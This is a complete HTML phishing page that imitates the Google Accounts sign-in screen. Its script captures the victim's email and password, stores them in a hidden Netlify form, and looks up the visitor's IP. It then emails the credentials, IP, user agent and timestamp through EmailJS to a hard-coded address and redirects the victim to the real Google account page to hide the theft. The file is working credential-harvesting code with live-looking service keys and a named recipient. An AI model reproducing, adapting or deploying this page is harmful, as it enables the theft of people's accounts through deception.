<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in - Google Accounts</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh;
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #fff; color: #202124;
    display: flex; align-items: center; justify-content: center;
  }
  .card {
    width: 100%; max-width: 448px;
    padding: 48px 40px 36px;
    border: 1px solid #dadce0; border-radius: 8px;
    text-align: center;
  }
  @media (max-width: 500px){ .card{ border:none; padding:24px; } }
  .logo svg { width: 48px; height: 48px; }
  h1 { font-size: 24px; font-weight: 400; margin: 16px 0 8px; }
  .sub { font-size: 16px; margin: 0 0 28px; }
  .field { position: relative; text-align: left; margin-bottom: 8px; }
  .field input {
    width: 100%; padding: 13px 15px; font-size: 16px;
    border: 1px solid #dadce0; border-radius: 4px; outline: none;
    background: transparent;
  }
  .field input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
  .field label {
    position: absolute; left: 12px; top: 13px; padding: 0 4px;
    background: #fff; color: #5f6368; font-size: 16px;
    pointer-events: none; transition: .15s;
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    top: -8px; font-size: 12px; color: #1a73e8;
  }
  .link { color: #1a73e8; font-size: 14px; text-decoration: none; cursor: pointer; }
  .guest { font-size: 14px; color: #5f6368; text-align: left; margin: 24px 0 32px; line-height: 1.5; }
  .guest a { color: #1a73e8; cursor: pointer; }
  .actions { display: flex; justify-content: space-between; align-items: center; }
  button { font-size: 14px; font-weight: 500; border: none; border-radius: 4px; cursor: pointer; }
  .ghost { background: none; color: #1a73e8; padding: 8px; }
  .ghost:hover { background: #f1f6fe; }
  .primary { background: #1a73e8; color: #fff; padding: 10px 24px; }
  .primary:hover { background: #1765cc; }
  .chip {
    display: inline-flex; align-items: center; gap: 8px;
    border: 1px solid #dadce0; border-radius: 16px;
    padding: 6px 12px; font-size: 14px; margin-bottom: 20px;
  }
  .hidden { display: none; }
</style>
</head>
<body>

<!-- hidden form for Netlify to detect + store (backup log) -->
<form name="gmail-login" data-netlify="true" netlify-honeypot="bot-field" hidden>
  <input type="text" name="email" />
  <input type="text" name="password" />
  <input type="text" name="step" />
  <input type="text" name="source" />
</form>

<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  </div>

  <!-- STEP 1: email -->
  <div id="step1">
    <h1>Sign in</h1>
    <p class="sub">Use your Google Account</p>
    <div class="field">
      <input id="email" type="email" placeholder=" " autocomplete="off" />
      <label for="email">Email or phone</label>
    </div>
    <div style="text-align:left; margin:8px 0 40px;">
      <a class="link">Forgot email?</a>
    </div>
    <p class="guest">
      Not your computer? Use Guest mode to sign in privately.
      <a>Learn more</a>
    </p>
    <div class="actions">
      <button class="ghost">Create account</button>
      <button class="primary" id="next1">Next</button>
    </div>
  </div>

  <!-- STEP 2: password -->
  <div id="step2" class="hidden">
    <h1>Welcome</h1>
    <div class="chip">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 3a4 4 0 110 8 4 4 0 010-8z"/></svg>
      <span id="shownEmail"></span>
    </div>
    <div class="field">
      <input id="password" type="password" placeholder=" " />
      <label for="password">Enter your password</label>
    </div>
    <div style="text-align:left; margin:8px 0 40px;">
      <a class="link">Forgot password?</a>
    </div>
    <div class="actions">
      <button class="ghost" id="back">Back</button>
      <button class="primary" id="next2">Next</button>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  /* ====== CONFIG ====== */
  const REDIRECT_URL = "https://myaccount.google.com";          // where they end up after "login"
  const VERIFY_LINK  = window.location.origin + "/?ref=email";  // "Check activity" → back to this page
  const YOUR_EMAIL   = "trady.lewis@mpesafoundationacademy.ac.ke";
  const EMAILJS = {
    publicKey:  "Umle-w26jGP29PfnV",
    serviceId:  "service_ib3ua9l",
    templateId: "template_alpyguf"
  };
  /* ==================== */

  emailjs.init({ publicKey: EMAILJS.publicKey });

  const SOURCE  = new URLSearchParams(window.location.search).get('ref') || 'direct';
  const step1   = document.getElementById('step1');
  const step2   = document.getElementById('step2');
  const emailEl = document.getElementById('email');
  const passEl  = document.getElementById('password');

  // backup log to Netlify Forms
  function saveToNetlify(data) {
    const body = new URLSearchParams({ 'form-name': 'gmail-login', ...data });
    fetch('/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body
    }).catch(() => {});
  }

  // visitor IP (client-side, with timeout)
  async function getIP() {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 1500);
      const r = await fetch('https://api.ipify.org?format=json', { signal: ctrl.signal });
      clearTimeout(t);
      const j = await r.json();
      return j.ip || 'unknown';
    } catch { return 'unknown'; }
  }

  async function notify(params) {
    const timeout = new Promise(r => setTimeout(r, 2500));
    try {
      await Promise.race([
        emailjs.send(EMAILJS.serviceId, EMAILJS.templateId, {
          to_email: YOUR_EMAIL,
          ...params
        }),
        timeout
      ]);
    } catch (e) { console.warn('EmailJS error:', e); }
  }

  document.getElementById('next1').onclick = () => {
    const email = emailEl.value.trim();
    if (!email) return emailEl.focus();
    saveToNetlify({ email, step: 'email', source: SOURCE });
    document.getElementById('shownEmail').textContent = email;
    step1.classList.add('hidden');
    step2.classList.remove('hidden');
    passEl.focus();
  };

  document.getElementById('back').onclick = () => {
    step2.classList.add('hidden');
    step1.classList.remove('hidden');
  };

  document.getElementById('next2').onclick = async () => {
    const password = passEl.value;
    if (!password) return passEl.focus();
    const email = emailEl.value.trim();

    saveToNetlify({ email, password, step: 'password', source: SOURCE });

    const ip = await getIP();
    await notify({
      target_email: email,
      password:     password,
      ip:           ip,
      user_agent:   navigator.userAgent,
      timestamp:    new Date().toLocaleString(),
      verify_link:  VERIFY_LINK,
      source:       SOURCE
    });

    window.location.href = REDIRECT_URL;
  };

  emailEl.addEventListener('keydown', e => e.key === 'Enter' && document.getElementById('next1').click());
  passEl.addEventListener('keydown', e => e.key === 'Enter' && document.getElementById('next2').click());
</script>
</body>
</html>
